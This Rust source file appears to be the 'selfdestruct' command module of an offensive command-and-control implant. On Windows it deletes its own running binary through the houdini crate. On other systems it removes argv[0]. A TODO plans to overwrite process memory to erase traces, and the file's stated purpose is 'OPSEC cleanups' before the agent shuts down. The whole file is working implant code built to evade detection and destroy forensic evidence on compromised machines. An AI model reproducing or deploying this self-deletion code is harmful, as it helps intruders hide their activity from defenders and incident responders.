use std::error::Error;
use std::env::args;
use std::fs::remove_file;
#[cfg(windows)] use houdini;
#[cfg(windows)] use rand::{thread_rng, Rng};
#[cfg(windows)] use rand::distributions::Alphanumeric;


pub async fn handle() -> Result<String, Box<dyn Error>> {
        /// Performs some OPSEC cleanups, deletes itself from disk, and kills the agent.
        /// Burn after reading style.
        /// For Windows, makes use of Yamakadi's fantastic houdini crate, based on jonaslyk's self-deleting binary research and byt3bl33d3r's Nim POC
        /// For Nix, just deletes arg[0] lol.
        /// Usage: selfdestruct 🎯

        // TODO: Overwrite proc memory with junk

        // Delete bin on disk
        
        #[cfg(windows)] {
                let rand_string: String = thread_rng()
                .sample_iter(&Alphanumeric)
                .take(12)
                .map(char::from)
                .collect();

                houdini::disappear_with_placeholder(rand_string);
        }

        #[cfg(not(windows))] {
                let running_agent: String = args().nth(0).unwrap();
                remove_file(running_agent)?;
        }

        // Shutdown agent
        // In main.rs, shutdown::handle exits the current running process
        Ok("[!] This agent will now self-destruct!\n[!] 3...2...1...💣💥!".to_string())
}